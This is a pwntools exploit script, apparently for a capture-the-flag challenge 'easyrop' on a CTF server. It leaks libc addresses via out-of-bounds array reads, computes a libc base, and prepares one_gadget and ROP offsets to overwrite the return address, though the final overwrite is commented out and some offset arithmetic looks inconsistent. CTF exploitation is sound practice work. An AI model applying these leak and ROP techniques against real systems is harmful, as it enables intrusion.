#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './easyrop'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
host, port = 'challs.tfcctf.com', 32484

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+324
'''.format(**locals())

def write(idx, payload):
    io.sendlineafter(b'Press', b'1')
    io.sendlineafter(b'index:', str(idx).encode())
    io.sendlineafter(b'write:', str(payload).encode())

def read(idx):
    io.sendlineafter(b'Press', b'2')
    io.sendlineafter(b'index:', str(idx).encode())
    io.recvuntil(b'is ')
    return io.recvline().strip().decode()

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()
rop = ROP(exe)

# 63 8 bytes of Array + 8 bytes of Canary
offset = 520 // 4

# getting libc leak
leak_1 = read(offset + 1)
leak_2 = read(offset + 0)
libc_leak = int(leak_1 + leak_2, 16)
libc_base = libc_leak - 0x1d90

# logging leaks
info('leak 1: %#s', leak_1)
info('leak 2: %#s', leak_2)
info('libc leak: %#x', libc_leak)
info('libc base: %#x', libc_base)

# calculating and formatting payload
one_gadget_1 = 0x50a37
one_gadget_2 = 0xebcf1
one_gadget_3 = 0xebcf5
one_gadget_4 = 0xebcf8
pop_rcx = libc_leak + 0x8c6bb
one_gadget = libc_leak + one_gadget_1

# logging payload
info('pop rcx: %#x', pop_rcx)
info('one_gadget: %#x', one_gadget)

# overwriting RIP with one gadget
# write(offset + 0, pop_rcx)
# write(offset + 1, )

# io.sendline(b'3')
io.interactive()   